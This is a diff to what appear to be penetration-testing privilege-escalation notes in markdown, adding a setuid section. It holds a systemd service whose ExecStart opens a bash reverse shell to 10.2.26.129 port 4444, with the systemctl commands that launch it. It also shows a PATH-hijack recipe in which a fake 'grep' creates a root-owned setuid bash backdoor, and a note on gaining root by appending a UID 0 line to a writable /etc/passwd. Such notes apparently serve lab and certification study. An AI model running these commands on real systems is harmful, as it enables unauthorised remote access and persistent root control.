@@ -141,8 +141,9 @@ Look at startup scripts, possible cron jobs, user .bashrc's etc. and see if anyt
 
 ### By default home direcotry is created with world readable. 
 
+## SUID
 
-#### SUID /bin/systemctl
+### SUID /bin/systemctl
 create revshell.service as:
 ```bash
 revshell.service
@@ -153,7 +154,7 @@ ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.26.129/4444 0>&1"
 WantedBy=multi-user.target
 
 ```
-#### systemctl
+### systemctl
 ```bash
 systemctl link /tmp/revshell.service
 Created symlink from /etc/systemd/system/revshell.service to /tmp/revshell.service.
@@ -165,6 +166,23 @@ systemctl start revshell.service
 
 ```
 After it runs successfully you will get reverse shell back to kali.
+
+## Abusing setuid 
+```bash 
+find /usr/bin -perm -4000
+checkHost program is found. 
+ltrace checkHost 8.8.8.8
+shows: system("ping -c 1 8.8.8.8 2>&1 |grep tra".....)
+Here we are executing someting on the shell and pipe to that grep and the problem is that here is no path. We can control the path.  
+vi grep 
+export PATH=.:$PATH (Grab any command from my directory first and go then go to search the rest of the path)
+checkhost 8.8.8.8 (It will use our version of the grep.) It will absorb any path that I will give. This is the beatuy of this attack. 
+vi grep
+#!/bin/dash
+cp /bin/bash backdoor
+chown root:root backdoor
+chmod u+s backdoor
+```
 
 ### /etc/passwd world writable
 * Simply appending in /etc/passwd and making the UID 0 will provide you the root access to system. 
